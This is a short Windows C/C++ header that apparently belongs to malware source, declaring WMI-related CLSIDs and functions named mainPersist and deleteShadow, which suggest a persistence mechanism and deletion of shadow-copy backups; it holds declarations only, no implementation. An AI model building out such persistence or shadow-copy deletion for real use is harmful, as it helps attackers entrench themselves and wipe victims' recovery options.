#pragma once
#include "windows.h"
#include <iostream>
#include <stdio.h>

#ifndef __Persistent_h__
#define __Persistent_h__
extern LPCSTR tempFile_path;
extern DWORD RCLSID_WBEMPROX_DLL[];
extern DWORD RCLSID_FASTPROX_DLL[];
extern DWORD RIID_1[];
extern DWORD RIID_2[];
#endif

int createTemp();


int mainPersist(BOOL start);
int deleteShadow();

